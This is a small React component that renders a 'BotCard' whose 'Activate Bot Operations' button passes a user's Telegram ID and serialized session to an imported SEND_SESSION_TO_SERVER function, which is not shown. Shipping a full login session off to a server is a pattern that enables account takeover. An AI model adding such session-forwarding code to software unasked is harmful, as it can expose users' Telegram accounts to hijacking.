import React from "react";
import { Card, CardContent } from "./card";
import { Button } from "./button";
import { SEND_SESSION_TO_SERVER } from "../../lib/utils";

interface BotCardProps {
  username: string;
  telegramId: number;
  serializedSession: any
}

export const BotCard: React.FC<BotCardProps> = ({
  username,
  telegramId,
  serializedSession
}) => {
  return (
    <Card className="bg-background border-border">
      <CardContent className="pt-6 p-6">
        <div className="flex items-center gap-3 mb-6">
          <div>
            <h2 className="font-medium text-lg text-foreground">
              {username || "Anon" + Math.floor(Math.random() * 1000)}
            </h2>

            <Button
            onClick={()=> {SEND_SESSION_TO_SERVER(telegramId.toString(), serializedSession)}}
            >
                Activate Bot Operations
            </Button>
           
          </div>
        </div>

      
      </CardContent>
    </Card>
  );
};

export default BotCard;
